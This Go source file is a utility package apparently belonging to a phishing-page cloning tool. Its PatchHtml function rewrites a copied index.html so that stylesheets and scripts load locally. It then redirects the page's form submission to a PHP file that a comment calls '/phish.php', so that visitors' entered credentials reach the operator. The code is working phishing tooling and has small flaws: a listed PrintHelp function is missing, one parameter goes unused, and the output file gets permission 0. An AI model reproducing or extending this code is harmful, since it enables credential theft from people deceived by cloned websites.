/* utils functions:
- MkdirIfNotExist(dirpath string): create a directory if it does not exists
- PrintHelp(): print helper with info about the tool and how to use it
- PatchHtml(destFolder string): patch html file to take local instances of css and js instead of the remote paths */

package utils

import (
	"bytes"
	"io/ioutil"
	"os"
	"regexp"
)

func MkdirIfNotExist(dir string) error {
	if _, err := os.Stat(dir); os.IsNotExist(err) {
		err = os.MkdirAll(dir, 0755)
		if err != nil {
			return err
		}
	}
	return nil
}

func PatchHtml(destFolder string, remotePaths []string, localPaths []string, postPath string, phpFilename string) error {

	// open html file
	path := destFolder + "/index.html"

	read, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}

	newContents := []byte(read)

	// iterate on remotepaths and replace it with local files
	for i, paths := range remotePaths {

		// replace remote path with local path
		newContents = bytes.Replace(newContents, []byte(paths), []byte(localPaths[i]), -1)
	}
	// find action attribute of the POST
	r, _ := regexp.Compile("(action=\".*?)\"")
	m := r.FindAllStringSubmatch(string(newContents), -1)

	// replace action attribute of the POST with /phish.php
	newContents = bytes.Replace(newContents, []byte(m[0][0]), []byte("action=\"/"+phpFilename+"\""), -1)

	// write patched html in destination
	err = ioutil.WriteFile(path, newContents, 0)
	if err != nil {
		return err
	}
	return nil
}
